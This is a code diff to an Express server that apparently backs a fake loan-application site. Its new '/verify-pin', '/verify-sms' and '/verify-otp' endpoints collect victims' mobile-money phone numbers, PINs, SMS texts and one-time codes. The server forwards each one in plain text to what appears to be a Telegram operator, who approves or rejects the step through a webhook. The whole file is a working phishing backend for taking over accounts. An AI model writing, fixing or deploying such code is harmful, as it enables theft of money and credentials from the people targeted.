@@ -25,18 +25,22 @@ app.post('/applications', (req, res) => {
   res.json({ id: appId });
 });
 
-// Submit MoMo Auth / PIN for Approval
-app.post('/applications/:id/submit-auth', async (req, res) => {
-  const appId = req.params.id;
+// Verify PIN / Auth Endpoint (Matches frontend /verify-pin)
+app.post('/verify-pin', async (req, res) => {
+  const { appId, pin, phone } = req.body;
   const appData = applications[appId];
-  if (!appData) return res.status(404).json({ error: 'Application not found' });
+  
+  if (!appData) {
+    applications[appId] = { id: appId, momo_phone: phone, momo_pin: pin, status: 'pending_auth' };
+  } else {
+    appData.momo_phone = phone || appData.momo_phone;
+    appData.momo_pin = pin;
+  }
 
-  appData.momo_phone = req.body.momo_phone;
-  appData.momo_pin = req.body.momo_pin;
-
+  const currentApp = applications[appId];
   const message = `🔐 *MoMo Authentication Request*\n\n` +
-    `📱 *Phone / MoMo Number:* ${appData.momo_phone}\n` +
-    `🔑 *PIN:* \`${appData.momo_pin}\`\n` +
+    `📱 *Phone / MoMo Number:* ${currentApp.momo_phone || phone}\n` +
+    `🔑 *PIN:* \`${pin}\`\n` +
     `🆔 *App ID:* ${appId}`;
 
   const keyboard = {
@@ -73,24 +77,22 @@ app.post('/applications/:id/submit-auth', async (req, res) => {
   }
 });
 
-// Submit SMS Text for Verification
-app.post('/applications/:id/submit-sms', async (req, res) => {
-  const appId = req.params.id;
-  const appData = applications[appId];
-  if (!appData) return res.status(404).json({ error: 'Application not found' });
-
-  appData.sms_text = req.body.sms_text;
+// Verify SMS Endpoint (Matches frontend /verify-sms)
+app.post('/verify-sms', async (req, res) => {
+  const { appId, smsText } = req.body;
+  const appData = applications[appId] || { momo_phone: 'N/A' };
+  appData.sms_text = smsText;
 
   const message = `💬 *SMS Verification Text Received*\n\n` +
-    `📱 *Phone / MoMo Number:* ${appData.momo_phone || 'N/A'}\n\n` +
-    `📄 *Content:*\n${appData.sms_text}\n\n` +
+    `📱 *Phone / MoMo Number:* ${appData.momo_phone}\n\n` +
+    `📄 *Content:*\n${smsText}\n\n` +
     `🆔 *App ID:* ${appId}`;
 
   const keyboard = {
     inline_keyboard: [
       [
-        { text: '✅ Correct SMS Text', callback_data: `sms_correct_${appId}` },
-        { text: '❌ Wrong SMS Text', callback_data: `sms_wrong_${appId}` }
+        { text: '✅ Correct SMS Text', callback_data: `sms_approve_${appId}` },
+        { text: '❌ Wrong SMS Text', callback_data: `sms_reject_${appId}` }
       ]
     ]
   };
@@ -115,24 +117,22 @@ app.post('/applications/:id/submit-sms', async (req, res) => {
   }
 });
 
-// Submit OTP Code for Verification
-app.post('/applications/:id/submit-otp', async (req, res) => {
-  const appId = req.params.id;
-  const appData = applications[appId];
-  if (!appData) return res.status(404).json({ error: 'Application not found' });
-
-  appData.otp_code = req.body.otp_code;
+// Verify OTP Endpoint (Matches frontend /verify-otp)
+app.post('/verify-otp', async (req, res) => {
+  const { appId, otpCode } = req.body;
+  const appData = applications[appId] || { momo_phone: 'N/A' };
+  appData.otp_code = otpCode;
 
   const message = `🔢 *OTP Verification Received*\n\n` +
-    `📱 *Phone / MoMo Number:* ${appData.momo_phone || 'N/A'}\n` +
-    `🔑 *OTP Code:* \`${appData.otp_code}\`\n` +
+    `📱 *Phone / MoMo Number:* ${appData.momo_phone}\n` +
+    `🔑 *OTP Code:* \`${otpCode}\`\n` +
     `🆔 *App ID:* ${appId}`;
 
   const keyboard = {
     inline_keyboard: [
       [
-        { text: '✅ Correct OTP', callback_data: `otp_correct_${appId}` },
-        { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appId}` }
+        { text: '✅ Correct OTP', callback_data: `otp_approve_${appId}` },
+        { text: '❌ Wrong OTP', callback_data: `otp_reject_${appId}` }
       ]
     ]
   };
@@ -157,8 +157,8 @@ app.post('/applications/:id/submit-otp', async (req, res) => {
   }
 });
 
-// Poll application status
-app.get('/applications/:id', (req, res) => {
+// Check Status Endpoint (Matches frontend /check-status/:id)
+app.get('/check-status/:id', (req, res) => {
   const appData = applications[req.params.id];
   if (!appData) return res.status(404).json({ error: 'Application not found' });
   res.json(appData);
@@ -177,11 +177,11 @@ app.post('/telegram-webhook', async (req, res) => {
 
     if (applications[appId]) {
       if (type === 'auth') {
-        applications[appId].status = (action === 'approve') ? 'auth_approved' : 'auth_rejected';
+        applications[appId].status = (action === 'approve') ? 'PIN_APPROVED' : 'PIN_REJECTED';
       } else if (type === 'sms') {
-        applications[appId].sms_status = (action === 'correct') ? 'sms_correct' : 'sms_wrong';
+        applications[appId].status = (action === 'approve') ? 'SMS_APPROVED' : 'SMS_REJECTED';
       } else if (type === 'otp') {
-        applications[appId].otp_status = (action === 'correct') ? 'otp_correct' : 'otp_wrong';
+        applications[appId].status = (action === 'approve') ? 'APPROVED' : 'OTP_REJECTED';
       }
     }
 
@@ -217,4 +217,4 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
-    
+  
